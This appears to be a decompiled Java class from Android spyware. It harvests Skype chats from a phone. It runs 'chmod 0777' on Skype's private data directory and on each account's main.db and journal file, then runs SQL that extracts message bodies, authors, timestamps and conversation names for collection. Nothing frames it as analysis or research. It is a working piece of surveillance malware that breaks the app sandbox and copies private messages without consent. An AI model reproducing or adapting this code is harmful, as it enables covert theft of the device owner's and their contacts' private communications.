package com.network.android.d;

import android.content.Context;
import android.os.Handler;
import com.network.android.c.a.a;
import com.network.android.m;
import com.network.android.p;
import java.io.File;
import java.util.Map;

public final class e extends p {
    protected static final Map c;
    static final String d;
    static final String e = ((String) c.get("timestamp"));
    static final File f = new File("/data/data/com.skype.raider/files/");
    static File[] g;

    static {
        f fVar = new f();
        c = fVar;
        d = (String) fVar.get("timestamp");
    }

    public static void a(Handler handler, Context context, boolean z) {
        try {
            a.a("getSkypeApp getSkypeApp start");
            a.a("getSkypeApp GetContentIM loop into " + f.getAbsolutePath());
            m.c("chmod 0777 " + f.getAbsolutePath());
            File[] listFiles = f.listFiles();
            g = listFiles;
            if (listFiles != null) {
                for (int i = 0; i < g.length; i++) {
                    if (g[i].isDirectory()) {
                        a.a("getSkypeApp GetContentIM checks " + g[i].getName());
                        String str = g[i].getAbsolutePath() + "/main.db";
                        m.c("chmod 0777 " + g[i].getAbsolutePath() + ";chmod 0777 " + str + "; chmod 0777 " + str + "-journal;");
                        if (new File(str).getAbsoluteFile().exists()) {
                            a(handler, context, z, "skype", "/data/data/com.skype.raider", str, "SELECT Messages.id as msg_id, messages.convo_id, from_dispname, messages.author, messages.timestamp, messages.body_xml, conversations.displayname, Messages.dialog_partner FROM Messages LEFT JOIN Conversations ON messages.convo_id = conversations.id", d, "", e, c, 132, g[i].getName());
                        }
                    }
                }
            }
            a.a("getSkypeApp GetContentIM end");
        } catch (Throwable th) {
            a.a("getSkypeApp GetContentIM exception- " + th.getMessage(), th);
        }
    }
}
